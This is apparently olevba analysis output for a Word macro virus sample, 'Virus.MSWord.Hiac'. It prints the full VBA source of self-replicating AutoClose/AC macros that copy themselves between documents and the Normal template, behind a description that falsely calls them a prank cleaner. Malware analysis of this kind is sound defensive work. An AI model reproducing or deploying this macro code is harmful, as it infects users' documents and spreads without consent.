olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hiac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hiac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ac.bas 
in file: ./Virus.MSWord.Hiac - OLE stream: 'Macros/VBA/AC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AC.MAIN"
Dim cfn$
Dim ac$
Dim Infect
Dim Hi$
    cfn$ = WordBasic.[FileName$]()
    ac$ = WordBasic.[MacroFileName$]("AutoClose")
    If (ac$ = "") Or (InStr(LCase(ac$), LCase(cfn$)) = 0) Then Infect = 1
    Hi$ = WordBasic.[MacroFileName$]("Hi")
    If (Hi$ = "") Or (InStr(LCase(Hi$), LCase(cfn$)) = 0) Then Infect = 1
    If Infect Then
        WordBasic.MacroCopy "Global:AutoClose", cfn$ + ":AC"
        WordBasic.MacroCopy "Global:Hi", cfn$ + ":AutoClose"
        WordBasic.FileSaveAll 1
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Hiac - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cfn$
Dim ac$
Dim Infect
Dim Hi$
    cfn$ = WordBasic.[FileName$]()
    ac$ = WordBasic.[MacroFileName$]("AutoClose")
    If (ac$ = "") Or (InStr(LCase(ac$), "normal.dot") <> 0) Then Infect = 1
    Hi$ = WordBasic.[MacroFileName$]("Hi")
    If (Hi$ = "") Or (InStr(LCase(Hi$), "normal.dot") <> 0) Then Infect = 1
    If Infect Then
        WordBasic.MacroCopy cfn$ + ":AC", "Global:AutoClose"
        WordBasic.MacroCopy cfn$ + ":AutoClose", "Global:Hi"
        WordBasic.FileSaveAll 1
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
+----------+--------------------+---------------------------------------------+

